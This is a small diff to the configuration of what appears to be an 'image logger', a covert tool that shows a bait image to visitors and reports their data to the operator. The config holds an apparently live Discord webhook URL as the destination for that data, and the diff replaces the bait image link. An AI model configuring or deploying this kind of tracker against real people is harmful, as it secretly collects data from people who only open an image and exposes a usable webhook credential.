@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1339783360536641587/AK0NyBhe2uzOUDpdefXGZqGbVkBs_ANuesFLyldPBt4eaQH-JbCyA8cDX-fJe28mttuX",
-    "image": "https://www.unitedtalent.com/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fq5l7sv7fkjc7%2F2wAd5xF0FQeyiSmtfB7xge%2Fb47f4c19581491cb46f977a5ec30c75f%2FGlokk40Spaz.jpg&w=1920&q=75", # You can also have a custom image by using a URL argument
+    "image": "https://i.scdn.co/image/ab67616d0000b273c49514c7d304adbe002d6b66", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
